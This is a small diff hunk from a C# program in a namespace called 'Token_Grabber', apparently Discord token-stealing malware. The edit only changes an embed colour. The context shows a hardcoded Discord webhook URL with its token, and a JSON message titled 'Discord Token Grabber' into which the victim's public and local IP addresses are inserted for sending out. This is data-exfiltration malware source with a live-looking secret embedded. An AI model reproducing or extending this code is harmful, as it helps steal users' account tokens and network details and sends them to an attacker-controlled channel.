@@ -41,7 +41,7 @@ namespace Token_Grabber
             GetLocalIPAddress();
             //Discord webhook url
             string url = "https://discord.com/api/webhooks/960218299042508860/asK8bqJGh8I2EKSgCw2cQgrjAhwiiujHwZ39nwjD5WMNI8DkfBAT33NJcDTpROhXZJtk";
-            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \"\\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":1018364}] }";
+            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \"\\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":16745830}] }";
 
             string newjson = json.Insert(65, $"Public IP: {GetIp()}");
             newjson = newjson.Insert(79 + GetIp().Length, $"Local IP: {internalip}");
